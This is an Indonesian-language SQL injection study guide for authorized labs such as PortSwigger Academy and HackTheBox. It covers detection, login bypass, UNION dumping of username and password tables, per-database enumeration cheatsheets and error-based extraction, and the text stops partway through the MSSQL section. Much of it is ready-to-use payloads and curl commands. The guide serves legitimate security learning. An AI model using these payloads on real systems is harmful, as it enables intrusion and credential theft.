---
id: "19"
title: "💉 19 — SQL Injection Workflow"
category: "3. Web Exploitation"
categoryId: "web"
filename: "19_sql_injection_workflow.md"
refs_out: ["05","06","07","18","44","45","63"]
refs_in: ["15","18","20","27","28","30"]
---

# 💉 19 — SQL Injection Workflow

> **Scope:** PortSwigger Web Security Academy, HackTheBox, TryHackMe, Proving Grounds, dan lab/target yang memang memberikan izin pengujian. **OS:** Parrot OS XFCE / Debian-based **Primary Tool:** Burp Suite (Community / Pro) **Level:** Beginner → Intermediate **Tujuan:** Membangun _muscle memory_ SQL Injection dari detection → identification → exploitation → escalation, berbasis materi PortSwigger Web Security Academy.

---

> **🔧 Konvensi Tool di Dokumen Ini:**
> 
> - **`[Burp]`** → Gunakan Burp Suite Repeater/Proxy. Ini adalah tool utama.
> - **`[curl]`** → Dipakai untuk quick check atau verifikasi output.
> - **Payload format** → Ditampilkan dalam format URL query string yang terlihat di Burp Repeater: `category=Gifts'+UNION+SELECT+NULL--`
> - **`+`** dalam payload = spasi (URL encoding). Di Burp Repeater kamu bisa ketik spasi langsung, Burp yang encode.
> - **`[MySQL]` `[PgSQL]` `[MSSQL]` `[Oracle]` `[SQLite]`** → Label ini menandai syntax yang DB-specific, bukan universal.

---

# 📚 Daftar Isi

- [💉 0. SQL Injection Fundamentals](#-0-sql-injection-fundamentals)
- [🔎 1. Detection & Identification](#-1-detection--identification)
    - [1.1 Entry Points — Di Mana Mencari](#11-entry-points--di-mana-mencari)
    - [1.2 Single Quote — Per Context](#12-single-quote--per-context)
    - [1.3 Membaca Response Signals](#13-membaca-response-signals)
    - [1.4 Identify Database Type](#14-identify-database-type)
    - [1.5 Identify Injection Context](#15-identify-injection-context)
- [🔓 2. Login Bypass](#-2-login-bypass)
- [🔗 3. Classic / UNION SQL Injection](#-3-classic--union-sql-injection)
    - [3.1 Determining Column Count](#31-determining-column-count)
    - [3.2 Finding Displayable Column](#32-finding-displayable-column)
    - [3.3 Retrieving Data from Other Tables](#33-retrieving-data-from-other-tables)
    - [3.4 Retrieving Multiple Values in One Column](#34-retrieving-multiple-values-in-one-column)
    - [3.5 Querying DB Version — Oracle](#35-querying-db-version--oracle-lab-3)
    - [3.6 Querying DB Version — MySQL & MSSQL](#36-querying-db-version--mysql--mssql-lab-4)
    - [3.7 Listing DB Contents — Non-Oracle](#37-listing-db-contents--non-oracle-lab-5)
    - [3.8 Listing DB Contents — Oracle](#38-listing-db-contents--oracle-lab-6)
    - [3.9 Useful Queries per Database](#39-useful-queries-per-database)
- [💥 4. Error-Based SQL Injection](#-4-error-based-sql-injection)
    - [4.1 Visible Error-Based — PostgreSQL CAST](#41-visible-error-based--postgresql-cast-lab-13)
    - [4.2 MySQL Error-Based](#42-mysql-error-based)
    - [4.3 MSSQL Error-Based](#43-mssql-error-based)
    - [4.4 PostgreSQL Error-Based](#44-postgresql-error-based)
- [🕵️ 5. Boolean Blind SQL Injection](#-5-boolean-blind-sql-injection)
    - [5.1 Conditional Responses](#51-blind--conditional-responses-lab-11)
    - [5.2 Conditional Errors](#52-blind--conditional-errors-lab-12)
    - [5.3 Manual Boolean Extraction](#53-manual-boolean-extraction)
    - [5.4 Automation dengan Python](#54-automation-dengan-python)
- [⏱️ 6. Time-Based Blind SQL Injection](#-6-time-based-blind-sql-injection)
    - [6.1 Time Delays](#61-blind--time-delays-lab-14)
    - [6.2 Time Delays + Data Retrieval](#62-blind--time-delays--data-retrieval-lab-15)
    - [6.3 Per Database Syntax](#63-per-database-syntax)
    - [6.4 Kapan Pilih Time-Based vs Boolean](#64-kapan-pilih-time-based-vs-boolean)
- [📡 7. Out-of-Band SQL Injection](#-7-out-of-band-sql-injection)
    - [7.1 OOB Interaction](#71-oob-interaction-lab-16)
    - [7.2 OOB Data Exfiltration](#72-oob-data-exfiltration-lab-17)
- [🔁 8. Second-Order SQL Injection](#-8-second-order-sql-injection)
- [🧩 9. Filter / Encoding / WAF Bypass](#-9-filter--encoding--waf-bypass)
    - [9.1 XML Encoding Bypass](#91-filter-bypass-via-xml-encoding-lab-18)
    - [9.2 WAF Detection](#92-waf-detection)
    - [9.3 WAF Bypass Techniques](#93-waf-bypass-techniques)
- [🤖 10. SQLMap Workflow](#-10-sqlmap-workflow)
- [🧱 11. Stacked Queries](#-11-stacked-queries)
- [💻 12. SQL Injection → RCE / Escalation](#-12-sql-injection--rce--escalation)
- [🍃 13. NoSQL Injection](#-13-nosql-injection)
- [📨 14. Special Contexts](#-14-special-contexts)
- [⚙️ 15. Automation Scripts](#-15-automation-scripts)
- [🌳 16. Decision Trees](#-16-decision-trees)
- [🛠️ 17. Troubleshooting](#-17-troubleshooting)
- [🧠 18. Muscle Memory Quick Flow](#-18-muscle-memory-quick-flow)
- [✅ 19. Final Operational Checklist](#-19-final-operational-checklist)
- [⬇️ 20. Post-SQLi: Cross-Service Pivot](#-20-post-sqli-cross-service-pivot)
- [🎮 21. Interactive Decision Guide](#-21-interactive-decision-guide)
- [⚡ Quick Reference Cheatsheet](#-quick-reference-cheatsheet)

---

# 💉 0. SQL Injection Fundamentals

## SQL Query Normal

Misalnya aplikasi menerima:

```
category=Gifts
```

Backend menjalankan:

```sql
SELECT * FROM products WHERE category='Gifts' AND released=1
```

## Bagaimana SQL Injection Terjadi?

Masalah muncul ketika input user langsung digabungkan ke query tanpa sanitasi:

```
category=Gifts'
```

Menghasilkan query broken:

```sql
SELECT * FROM products WHERE category='Gifts'' AND released=1
```

Tanda kutip berlebih menyebabkan syntax error — ini adalah **sinyal awal**, bukan konfirmasi akhir.

```
User Input
    │
    ▼
SQL String Concatenation (tanpa sanitasi)
    │
    ▼
Database
    │
    ▼
Query yang berubah perilakunya
```

## Analogi Sederhana

Aplikasi mengharapkan:

```
"nomor produk: 10"
```

Tetapi user memberikan:

```
"10 ATAU kondisi selalu benar"
```

Aplikasi tidak membedakan data dengan instruksi SQL. Itulah inti SQLi.

## Kenapa Berbahaya?

```
Authentication Bypass
       ↓
Data Enumeration
       ↓
Credential Extraction
       ↓
Sensitive Data Access
       ↓
Database Modification
       ↓
File Read/Write
       ↓
Potential RCE
```

> ⚠️ Tidak semua SQLi memiliki seluruh kemampuan tersebut. Kemampuan tergantung pada DB type, privilege, dan konfigurasi server.

## In-Band vs Inferential vs Out-of-Band

|Tipe|Cara Mendapatkan Hasil|Contoh Teknik|
|---|---|---|
|In-band|Data langsung muncul di response|UNION, Error-Based|
|Inferential|Data disimpulkan dari TRUE/FALSE atau timing|Boolean Blind, Time-Based|
|Out-of-band|Database membuat callback ke sistem lain|DNS exfiltration, HTTP callback|

```
In-band:
Request → DB → Response + Data langsung

Inferential:
Request → DB → TRUE/FALSE atau Delay → Infer Data

OOB:
Request → DB → DNS/HTTP Callback → Attacker Listener
```

---

## Setup Burp Suite (Wajib Sebelum Mulai)

```
1. Buka Burp Suite
2. Proxy → Options → proxy listener aktif di 127.0.0.1:8080
3. Browser: pasang FoxyProxy atau set manual proxy ke 127.0.0.1:8080
4. Burp → Proxy → Intercept: ON saat mau intercept, OFF saat browsing biasa
5. HTTP History → lihat semua request yang lewat
```

**Workflow utama:**

```
Browse target
     │
     ▼
Request masuk ke Burp HTTP History
     │
     ▼
Klik kanan → Send to Repeater (Ctrl+R)
     │
     ▼
Di Repeater: modifikasi parameter → Send
     │
     ▼
Bandingkan response di panel kanan
```

---

# 🔎 1. Detection & Identification

## 1.1 Entry Points — Di Mana Mencari

Sebelum inject apapun, petakan kandidat lokasi injection:

```
GET parameter          → ?id=10, ?category=Gifts
POST parameter         → username=admin, search=test
Cookie                 → TrackingId=xyz, session=abc
HTTP Header            → User-Agent, X-Forwarded-For, Referer
JSON body              → {"search":"test"}
XML body               → <storeId>1</storeId>
```

```bash
# Quick: lihat semua parameter di halaman
curl -s http://TARGET | grep -oP '(href|action)="[^"]*\?[^"]*"' | sort -u

# Tech stack hint (bantu tebak DB)
curl -si http://TARGET | head -20
```

|Tech Stack|DB yang Mungkin|
|---|---|
|PHP + Apache/Nginx|MySQL / MariaDB|
|ASP.NET + IIS|MSSQL|
|Java / Spring|MySQL, PostgreSQL, Oracle|
|Python / Flask / Django|PostgreSQL, SQLite, MySQL|
|Node.js|MySQL, PostgreSQL, MongoDB|
|Ruby on Rails|PostgreSQL, SQLite|

---

## 1.2 Single Quote — Per Context

**📌 Tujuan:** Mengirim karakter yang bisa membreak SQL string context.

### GET Parameter

```bash
# Normal baseline
curl -s 'http://TARGET/item?id=10' -o baseline.html

# Single quote test
curl -s 'http://TARGET/item?id=10%27' -o quote_test.html
# Atau dengan --data-urlencode (lebih aman untuk karakter aneh):
curl -s --get --data-urlencode "id=10'" 'http://TARGET/item' -o quote_test.html
```

### POST Parameter

```bash
curl -s -X POST http://TARGET/search \
  --data-urlencode "q=test'"
# Bandingkan dengan:
curl -s -X POST http://TARGET/search \
  --data-urlencode "q=test"
```

### Cookie

```bash
curl -s http://TARGET/profile -H "Cookie: session=test'"
```

### HTTP Header

```bash
curl -s http://TARGET/ -H "User-Agent: test'"
curl -s http://TARGET/ -H "X-Forwarded-For: 10.0.0.1'"
curl -s http://TARGET/ -H "Referer: http://example.com/'"
```

> ⚠️ Header injection hanya relevan jika header tersebut dipakai dalam SQL query server-side (logging, rate limiting, personalization). Header yang hanya dibaca oleh proxy tidak menyebabkan SQLi.

### JSON Body

```bash
# Buat file body
cat > body.json <<'EOF'
{"search":"test'"}
EOF

curl -s -X POST http://TARGET/api/search \
  -H 'Content-Type: application/json' \
  --data-binary @body.json
```

---

## 1.3 Membaca Response Signals

### SQL Error Visible

```
MySQL:        "You have an error in your SQL syntax"
PostgreSQL:   "ERROR: syntax error at or near"
MSSQL:        "Unclosed quotation mark after the character string"
Oracle:       "ORA-01756" / "ORA-00933"
SQLite:       "near \"...\": syntax error" / "SQLiteException"
```

### Generic Error (Error Tersembunyi)

Aplikasi mungkin tidak tampilkan SQL error langsung:

```
500 Internal Server Error
"Something went wrong"
Response tiba-tiba jauh lebih kecil dari baseline
```

Ini bukan konfirmasi SQLi, tapi ini adalah kandidat — lanjut ke Boolean test.

### Boolean Difference

```bash
curl -s 'http://TARGET/item?id=10' -o baseline.html
curl -s 'http://TARGET/item?id=10%20AND%201%3D1' -o true_test.html
curl -s 'http://TARGET/item?id=10%20AND%201%3D2' -o false_test.html
wc -c baseline.html true_test.html false_test.html
```

Contoh output yang mengindikasikan Boolean Blind:

```
14820   baseline.html
14820   true_test.html
421     false_test.html    ← FALSE berbeda!
```

### Time Delay

```bash
# MySQL
time curl -s -o /dev/null --get \
  --data-urlencode "id=10 AND SLEEP(5)" http://TARGET/item

# PostgreSQL (lihat Section 6 untuk penjelasan syntax)
time curl -s -o /dev/null --get \
  --data-urlencode "id=10 AND 1=(SELECT 1 FROM pg_sleep(5))" http://TARGET/item

# MSSQL
time curl -s -o /dev/null --get \
  --data-urlencode "id=10; WAITFOR DELAY '0:0:5'" http://TARGET/item
```

### Detection Decision

```
Single Quote dikirim
│
├── SQL Error visible
│      ↓
│   Error-Based candidate → validate di Section 4
│
├── Response berbeda (size / content)
│      ↓
│   Boolean Blind candidate → validate di Section 5
│
├── Delay ~5-10 detik
│      ↓
│   Time-Based candidate → validate di Section 6
│
└── Tidak ada perbedaan
       ↓
   Jangan simpulkan "tidak ada SQLi"
       ↓
   Reassess: context lain, parameter lain, encoding berbeda
```

---

## 1.4 Identify Database Type

### 📌 Kapan Digunakan

Setelah menemukan indikasi SQLi. DB type menentukan seluruh syntax berikutnya.

|Indikator di Error|Database|
|---|---|
|`You have an error in your SQL syntax`|MySQL / MariaDB|
|`mysqli`, `PDOException` + MySQL driver|MySQL / MariaDB|
|`pg_query`, `PG::`, `syntax error at or near`|PostgreSQL|
|`Unclosed quotation mark`, `Microsoft SQL Server`|MSSQL|
|`ORA-01756`, `ORA-00933`|Oracle|
|`SQLiteException`, `near "...": syntax error`|SQLite|
|`SQLSTATE[HY000]`|Tergantung driver|

### Comment Syntax per Database

|Database|Comment Style|Catatan Penting|
|---|---|---|
|MySQL|`-- -` atau `#` (`%23`)|**`--` tanpa spasi tidak valid di MySQL.** Wajib ada spasi setelah `--`, atau gunakan `-- -` (lebih aman), atau `#`|
|PostgreSQL|`--`|Standar, spasi tidak wajib|
|MSSQL|`--`|Standar|
|Oracle|`--`|Standar|
|SQLite|`--`|Standar|

> ⚠️ **MySQL Critical:** `--` tanpa trailing space di-ignore MySQL parser. Selalu gunakan `-- -` (dash dash space dash) atau `#`/`%23`.

### Version Fingerprinting via Burp

Setelah tahu column count (Section 3.1), inject version query:

```
[MySQL]   category=Gifts'+UNION+SELECT+@@version,NULL-- -
[PgSQL]   category=Gifts'+UNION+SELECT+version(),NULL--
[Oracle]  category=Gifts'+UNION+SELECT+banner,NULL+FROM+v$version--
[MSSQL]   category=Gifts'+UNION+SELECT+@@VERSION,NULL--
[SQLite]  category=Gifts'+UNION+SELECT+sqlite_version(),NULL--
```

---

## 1.5 Identify Injection Context

### String Context

Query backend:

```sql
WHERE category='INPUT'
```

Test di Burp Repeater:

```
Gifts'          → broken quote → error?
Gifts''         → double quote → valid?
Gifts'+OR+'1'='1   → TRUE
Gifts'+OR+'1'='2   → FALSE
```

### Numeric Context

Query backend:

```sql
WHERE id=INPUT
```

Test:

```
id=10'           → error?
id=10+AND+1=1    → TRUE
id=10+AND+1=2    → FALSE
```

### Inside Subquery

```sql
SELECT * FROM users WHERE id=(SELECT INPUT);
```

Test:

```
1
1+1
1)        ← tutup parenthesis
```

### Context Testing Decision

```
Parameter
   │
   ▼
Guess context dari behavior
   │
   ├── String  → '+'OR+'1'='1
   ├── Numeric → +OR+1=1
   ├── Quoted  → tutup dengan quote yang sesuai
   ├── Comment → comment closure
   └── Subquery → tutup parenthesis
```

---

# 🔓 2. Login Bypass

### 📌 Skenario

Query backend untuk login:

```sql
SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
```

**Tujuan:** Login sebagai `administrator` tanpa tahu password.

### Payload Login Bypass

**Username field — comment out password check:**

```
username: administrator'--
password: (bebas, apapun)
```

Yang terjadi di backend:

```sql
SELECT * FROM users WHERE username='administrator'--' AND password='apapun'
```

`--` comment out semua setelah itu → password check di-skip → login berhasil.

### Burp Suite Steps

```
[Burp] Intercept POST /login request → Send to Repeater

Request asli:
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=wiener&password=peter

Ubah menjadi:
username=administrator'--&password=apapun
```

### Variasi Login Bypass

```sql
-- Username dengan comment (paling reliable)
administrator'--
admin'--
admin'-- -
admin'#

-- OR bypass (jika tidak tahu username — lebih berisiko multiple rows)
' OR 1=1--
' OR '1'='1'--
' OR 1=1 LIMIT 1--

-- Numeric context login
1 OR 1=1--
```

> **Catatan:** OR bypass bisa return multiple rows yang menyebabkan error tergantung implementasi. Gunakan `LIMIT 1` atau target username spesifik jika perlu.

### curl (quick check)

```bash
curl -si -X POST http://TARGET/login \
  -d "username=administrator'--&password=test" | \
  grep -i "location\|welcome\|dashboard"
```

---

# 🔗 3. Classic / UNION SQL Injection

> **Precondition UNION Attack:**
> 
> - Tahu jumlah kolom query asli
> - Minimal satu kolom menampilkan data string

---

## 3.1 Determining Column Count

### 📌 Tujuan

Sebelum bisa UNION, kita harus tahu berapa kolom yang di-return query asli.

### Method 1: ORDER BY (Paling Cepat)

```
[Burp] Repeater, inject satu per satu:
category=Gifts'+ORDER+BY+1--
category=Gifts'+ORDER+BY+2--
category=Gifts'+ORDER+BY+3--
category=Gifts'+ORDER+BY+4--   ← error di sini
```

Error pada `ORDER BY 4` berarti query punya **3 kolom**.

```bash
for i in 1 2 3 4 5 6; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    --get --data-urlencode "category=Gifts' ORDER BY $i-- -" \
    "http://TARGET/filter")
  echo "ORDER BY $i → HTTP $STATUS"
done
```

### Method 2: UNION SELECT NULL

```
category=Gifts'+UNION+SELECT+NULL--
category=Gifts'+UNION+SELECT+NULL,NULL--
category=Gifts'+UNION+SELECT+NULL,NULL,NULL--   ← 200 OK → 3 kolom
```

Lanjut tambah NULL sampai tidak error. Jumlah NULL = jumlah kolom.

### Oracle — Special Requirement

[Oracle] Di Oracle, setiap SELECT **wajib** ada FROM clause:

```
'+UNION+SELECT+NULL+FROM+DUAL--
'+UNION+SELECT+NULL,NULL+FROM+DUAL--
'+UNION+SELECT+NULL,NULL,NULL+FROM+DUAL--
```

---

## 3.2 Finding Displayable Column

### 📌 Tujuan

Setelah tahu jumlah kolom (misal 3), cari kolom mana yang bisa menampilkan string.

```
[Burp] Repeater — Ganti NULL satu per satu dengan string:
'+UNION+SELECT+'INJECTA',NULL,NULL--    ← test col 1
'+UNION+SELECT+NULL,'INJECTB',NULL--    ← test col 2
'+UNION+SELECT+NULL,NULL,'INJECTC'--    ← test col 3
```

Kolom yang menampilkan `INJECTA`/`INJECTB`/`INJECTC` di response = displayable column.

> **Tip:** Jika data asli muncul di response dan menghalangi inject row, gunakan `id=0` atau `id=99999` (ID yang tidak exist di DB) agar hanya row inject yang tampil.

---

## 3.3 Retrieving Data from Other Tables

### 📌 Skenario

DB punya tabel `users` dengan kolom `username` dan `password`.

```
[Burp] 2 kolom, keduanya displayable:
'+UNION+SELECT+username,password+FROM+users--
```

**Response yang diharapkan:**

```
administrator | s3cr3t_p4ssw0rd
wiener        | bluecheese
```

```bash
curl -s 'http://TARGET/filter?category=Gifts%27+UNION+SELECT+username,password+FROM+users--' \
  | grep -oP '<td>[^<]+</td>' | paste - -
```

---

## 3.4 Retrieving Multiple Values in One Column

### 📌 Skenario

Query hanya punya **1 kolom displayable**. Dump username dan password bersamaan.

### Teknik: Concatenation

Gabungkan dua nilai dengan separator yang mudah dikenali.

```
[PgSQL/Oracle] Pipe concatenation:
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--

[MySQL] CONCAT function:
'+UNION+SELECT+NULL,CONCAT(username,'~',password)+FROM+users-- -

[MSSQL] Plus operator:
'+UNION+SELECT+NULL,username+'~'+password+FROM+users--
```

**Response:**

```
administrator~s3cr3t_p4ssw0rd
wiener~bluecheese
```

### Separator Pilihan

```
~    → mudah dikenali (0x7e di hex)
:    → username:password format
|    → pipeline (hindari jika ada pipe filtering)
```

---

## 3.5 Querying DB Version — Oracle (Lab 3)

```
[Oracle] v$version mengandung version info:
'+UNION+SELECT+BANNER,NULL+FROM+v$version--
'+UNION+SELECT+BANNER,NULL+FROM+v$version+WHERE+ROWNUM=1--
```

**Response:**

```
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```

> **[Oracle] Note:** Selalu butuh `FROM` di setiap SELECT. Untuk SELECT tanpa tabel nyata, gunakan `FROM DUAL`:
> 
> ```
> '+UNION+SELECT+'abc','def'+FROM+DUAL--
> ```

---

## 3.6 Querying DB Version — MySQL & MSSQL (Lab 4)

**[MySQL]**

```
'+UNION+SELECT+@@version,NULL-- -
'+UNION+SELECT+@@version,NULL#
```

**Response:**

```
8.0.32-MySQL Community Server
```

**[MSSQL]**

```
'+UNION+SELECT+@@VERSION,NULL--
```

**Response:**

```
Microsoft SQL Server 2019 (RTM-CU18)...
```

> **MySQL Comment Gotcha:** `--` sendiri tidak valid di MySQL. Gunakan:
> 
> - `-- -` (dash dash space dash)
> - `--` (dash dash space — trailing space)
> - `#` / `%23` di URL

---

## 3.7 Listing DB Contents — Non-Oracle (Lab 5)

### Step 1 — List Tables

**[MySQL/PgSQL]**

```
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables+WHERE+table_schema=database()-- -
```

**[MSSQL]**

```
'+UNION+SELECT+name,NULL+FROM+sys.tables--
```

**Response:**

```
users_abcdef
products
orders
```

### Step 2 — List Columns dari Tabel Target

**[MySQL/PgSQL]**

```
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'-- -
```

**[MSSQL]**

```
'+UNION+SELECT+c.name,NULL+FROM+sys.columns+c+JOIN+sys.tables+t+ON+c.object_id=t.object_id+WHERE+t.name='users'--
```

### Step 3 — Dump Data

```
'+UNION+SELECT+username_col,password_col+FROM+users_abcdef-- -
```

### MySQL — GROUP_CONCAT (Ambil Semua Sekaligus)

```
'+UNION+SELECT+GROUP_CONCAT(table_name),NULL+FROM+information_schema.tables+WHERE+table_schema=database()-- -
'+UNION+SELECT+GROUP_CONCAT(column_name),NULL+FROM+information_schema.columns+WHERE+table_name='users'-- -
'+UNION+SELECT+GROUP_CONCAT(username,0x3a,password),NULL+FROM+users-- -
```

> ⚠️ **[MySQL] GROUP_CONCAT limit:** Default `group_concat_max_len` = 1024 bytes. Output bisa terpotong. Jika perlu lebih: `SET group_concat_max_len=65536` (jika stacked query didukung), atau pakai `LIMIT/OFFSET` per row.

### PostgreSQL — STRING_AGG

```
'+UNION+SELECT+string_agg(table_name,','),NULL+FROM+information_schema.tables+WHERE+table_schema='public'--
```

### MSSQL — STRING_AGG (SQL Server 2017+)

```
'+UNION+SELECT+STRING_AGG(name,','),NULL+FROM+sys.tables--
'+UNION+SELECT+STRING_AGG(name,','),NULL+FROM+sys.columns+WHERE+object_id=OBJECT_ID('users')--
```

---

## 3.8 Listing DB Contents — Oracle (Lab 6)

### 📌 Perbedaan dari Non-Oracle

Oracle **tidak punya `information_schema`**. Gunakan `all_tables` dan `all_tab_columns`.

### Step 1 — List Tables

```
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

### Step 2 — List Columns

```
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
```

> ⚠️ **[Oracle]:** Nama tabel di `all_tab_columns` biasanya uppercase.

### Step 3 — Dump Data

```
'+UNION+SELECT+USERNAME_COL,PASSWORD_COL+FROM+USERS_ABCDEF--
```

---

## 3.9 Useful Queries per Database

### Version

|DB|Query|
|---|---|
|MySQL|`@@version` atau `version()`|
|PostgreSQL|`version()`|
|MSSQL|`@@VERSION`|
|Oracle|`SELECT banner FROM v$version`|
|SQLite|`sqlite_version()`|

### Current Database

|DB|Query|
|---|---|
|MySQL|`database()`|
|PostgreSQL|`current_database()`|
|MSSQL|`DB_NAME()`|
|Oracle|`SYS_CONTEXT('USERENV','DB_NAME') FROM dual`|
|SQLite|`'main'` (file-based; nama file adalah "database")|

### Current User

|DB|Query|
|---|---|
|MySQL|`user()` atau `USER()`|
|PostgreSQL|`current_user`|
|MSSQL|`SYSTEM_USER` / `SUSER_SNAME()`|
|Oracle|`USER FROM dual`|
|SQLite|N/A (file permissions OS)|

### List Tables

|DB|Query|
|---|---|
|MySQL|`SELECT table_name FROM information_schema.tables WHERE table_schema=database()`|
|PostgreSQL|`SELECT table_name FROM information_schema.tables WHERE table_schema='public'`|
|MSSQL|`SELECT name FROM sys.tables`|
|Oracle|`SELECT table_name FROM all_tables`|
|SQLite|`SELECT name FROM sqlite_master WHERE type='table'`|

### List Columns

|DB|Query|
|---|---|
|MySQL|`SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema=database()`|
|PostgreSQL|`SELECT column_name FROM information_schema.columns WHERE table_schema='public' AND table_name='users'`|
|MSSQL|`SELECT c.name FROM sys.columns c JOIN sys.tables t ON c.object_id=t.object_id WHERE t.name='users'`|
|Oracle|`SELECT column_name FROM all_tab_columns WHERE table_name='USERS'`|
|SQLite|`SELECT sql FROM sqlite_master WHERE type='table' AND name='users'`|

> **[SQLite] Alternatif:** `PRAGMA table_info(users)` — mengembalikan id, name, type, notnull, dflt_value, pk per kolom. Tersedia jika multi-statement didukung.

### Concatenation

|DB|Syntax|
|---|---|
|MySQL|`CONCAT(username,':',password)`|
|PostgreSQL|`username\|':'\|password`|
|Oracle|`username\|':'\|password`|
|MSSQL|`username+':'+password`|
|SQLite|`username\|':'\|password`|

### Privileges (untuk pre-RCE check)

|DB|Query|
|---|---|
|MySQL|`SELECT PRIVILEGE_TYPE FROM information_schema.user_privileges WHERE GRANTEE=CONCAT(CHAR(39),user(),CHAR(39))`|
|PostgreSQL|`SELECT rolsuper, rolcreatedb FROM pg_roles WHERE rolname=current_user`|
|MSSQL|`SELECT * FROM fn_my_permissions(NULL,'DATABASE')`|
|Oracle|`SELECT privilege FROM session_privs`|

---

### Per-DB Complete Cheatsheets

#### MySQL / MariaDB

```sql
-- Version
SELECT @@version;
-- Current DB
SELECT database();
-- Current user
SELECT user();
-- All databases
SHOW DATABASES;
SELECT schema_name FROM information_schema.schemata;
-- Tables
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
-- Columns
SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema=database();
-- Dump (single column)
SELECT GROUP_CONCAT(username,':',password) FROM users;
-- Privileges
SELECT PRIVILEGE_TYPE FROM information_schema.user_privileges WHERE GRANTEE=CONCAT(CHAR(39),user(),CHAR(39));
-- Secure file check
SELECT @@secure_file_priv;
```

#### PostgreSQL

```sql
-- Version
SELECT version();
-- Current DB
SELECT current_database();
-- Current user
SELECT current_user;
-- All databases
SELECT datname FROM pg_database;
-- Tables (public schema)
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
-- Columns
SELECT column_name FROM information_schema.columns WHERE table_schema='public' AND table_name='users';
-- Dump (single column)
SELECT string_agg(username||':'||password,',') FROM users;
-- Roles / superuser check
SELECT rolname, rolsuper, rolcreatedb FROM pg_roles WHERE rolname=current_user;
```

#### MSSQL

```sql
-- Version
SELECT @@VERSION;
-- Current DB
SELECT DB_NAME();
-- Current user
SELECT SYSTEM_USER;
-- All databases
SELECT name FROM sys.databases;
-- Tables
SELECT name FROM sys.tables;
-- Columns
SELECT c.name FROM sys.columns c JOIN sys.tables t ON c.object_id=t.object_id WHERE t.name='users';
-- Dump
SELECT STRING_AGG(username+':'+password,',') FROM users;  -- SQL Server 2017+
SELECT username+':'+password FROM users FOR XML PATH('');  -- Older versions
-- Privileges
SELECT * FROM fn_my_permissions(NULL,'DATABASE');
```

#### Oracle

```sql
-- Version
SELECT banner FROM v$version;
-- Current DB
SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual;
-- Current user
SELECT USER FROM dual;
-- All schemas/users
SELECT username FROM all_users;
-- Tables (visible to current user)
SELECT table_name FROM all_tables;
-- Columns
SELECT column_name FROM all_tab_columns WHERE table_name='USERS';
-- Dump (single column)
SELECT LISTAGG(username||':'||password,',') WITHIN GROUP (ORDER BY username) FROM users;
-- Privileges
SELECT privilege FROM session_privs;
```

#### SQLite — Special Notes

```sql
-- Version
SELECT sqlite_version();
-- Tables (NO information_schema!)
SELECT name FROM sqlite_master WHERE type='table';
-- Table schema (get column names)
SELECT sql FROM sqlite_master WHERE type='table' AND name='users';
-- Columns via PRAGMA (jika didukung)
PRAGMA table_info(users);
-- Dump
SELECT group_concat(username||':'||password) FROM users;
```

> **⚠️ SQLite Critical Limitations:**
> 
> 1. **Tidak ada `information_schema`** — selalu gunakan `sqlite_master`
> 2. **Tidak ada native `SLEEP()`** — time-based blind umumnya tidak bisa dilakukan (SQLite tidak punya fungsi delay bawaan)
> 3. **File-Based Security** — tidak ada sistem user database terpisah; hak akses diatur oleh file permissions OS (`.sqlite`, `.db`, `.sqlite3`)
> 4. **Stacked queries** — tergantung API/driver yang digunakan aplikasi

---

# 💥 4. Error-Based SQL Injection

## 4.1 Visible Error-Based — PostgreSQL CAST (Lab 13)

### 📌 Skenario

Aplikasi menampilkan error message dari database yang mengandung data. Contoh verbose error:

```
ERROR: invalid input syntax for type integer: "administrator"
```

Data (`administrator`) muncul di error message!

### Teknik: CAST Type Mismatch

Paksa DB convert string ke integer → error berisi nilai query.

**[PgSQL] Payload:**

```
'+AND+CAST((SELECT+username+FROM+users+LIMIT+1)+AS+integer)--
```

**[Burp] Inject di cookie atau parameter:**

```
TrackingId=xyz'+AND+CAST((SELECT+username+FROM+users+LIMIT+1)+AS+integer)--
```

**Error yang muncul:**

```
ERROR: invalid input syntax for type integer: "administrator"
```

→ `administrator` adalah username pertama!

**Lanjut dump password:**

```
'+AND+CAST((SELECT+password+FROM+users+WHERE+username='administrator'+LIMIT+1)+AS+integer)--
```

**Error:**

```
ERROR: invalid input syntax for type integer: "s3cr3t_p4ssw0rd"
```

---

## 4.2 MySQL Error-Based

### 📌 Kapan Digunakan

Saat DB menampilkan error dan MySQL fungsi error-based tersedia.

### ExtractValue

```
[MySQL]
'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+database()),0x7e))-- -
```

**Response:**

```
XPATH syntax error: '~shopdb~'
```

Data muncul di antara `~`. Lanjut ekstrak tabel:

```
'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables+WHERE+table_schema=database()),0x7e))-- -
```

**Response:**

```
XPATH syntax error: '~users,products,orders~'
```

### UpdateXML

```
[MySQL]
'+AND+UPDATEXML(NULL,CONCAT(0x7e,(SELECT+database()),0x7e),NULL)-- -
```

> ⚠️ **[MySQL] ExtractValue / UpdateXML output limit:** ~32 karakter per error. Untuk nilai panjang gunakan SUBSTRING:
> 
> ```
> '+AND+EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT+password+FROM+users+LIMIT+1),1,30),0x7e))-- -
> '+AND+EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT+password+FROM+users+LIMIT+1),31,60),0x7e))-- -
> ```

---

## 4.3 MSSQL Error-Based

### CONVERT Type Mismatch

```
[MSSQL]
'+AND+1=CONVERT(int,(SELECT+TOP+1+name+FROM+sys.databases))--
```

**Error:**

```
Conversion failed when converting the nvarchar value 'master' to data type int.
```

### Dump Step by Step

```
[MSSQL]
-- DB name
'+AND+1=CONVERT(int,(SELECT+DB_NAME()))--

-- Tables
'+AND+1=CONVERT(int,(SELECT+TOP+1+name+FROM+sys.tables))--

